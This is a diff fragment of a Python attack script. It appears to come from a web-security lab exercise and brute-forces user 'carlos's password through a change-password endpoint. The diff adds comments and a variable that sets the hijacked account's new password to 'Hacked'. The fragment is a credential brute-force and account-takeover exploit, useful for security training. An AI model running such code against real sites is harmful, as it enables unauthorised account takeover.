@@ -69,14 +69,15 @@ print(Fore.WHITE + "[#] Brute forcing password of " +
       Fore.GREEN + F"carlos..")
 for (index, password) in enumerate(passwords):
     login_res = login(f"{url}/login", "wiener", "peter")
-    if login_res.status_code == 302:
-        session = login_res.cookies.get("session")
+    if login_res.status_code == 302:  # if you login successfully
+        session = login_res.cookies.get("session")  # get the valid session
+        new_password = "Hacked"  # chagne this to what you want
         change_res = change_password(f"{url}/my-account/change-password",
-                                     session, "carlos", password, "LoL")
+                                     session, "carlos", password, new_password)  # try to change the password
         if change_res.status_code == 200:
             print(Fore.BLUE + f"\n[*] {password} => " + Fore.GREEN + "Correct")
             print(Fore.WHITE +
-                  f"[#] Password changed to: " + Fore.GREEN + "LoL")
+                  f"[#] Password changed to: " + Fore.GREEN + new_password)
             break
         else:
             print(Fore.BLUE + f"[*] {password:10} => " +
